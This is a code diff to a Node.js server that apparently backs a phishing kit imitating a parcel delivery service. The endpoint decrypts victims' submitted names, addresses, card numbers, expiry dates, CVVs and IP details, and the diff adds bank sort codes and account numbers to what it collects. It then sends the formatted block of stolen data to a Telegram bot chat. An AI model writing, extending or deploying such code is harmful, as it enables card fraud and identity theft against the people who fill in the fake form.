@@ -542,6 +542,8 @@ app.post('/mazzaYodel', (req, res) => {
     cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
     userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
     userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
+    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
+    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
     bin = req.body.bin;
 
     if (bin.length === 7) {
@@ -559,7 +561,7 @@ app.post('/mazzaYodel', (req, res) => {
         }
     }).then(function () {
         binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
-        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
         if (mazCount == 6) {
             axios.post(
                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
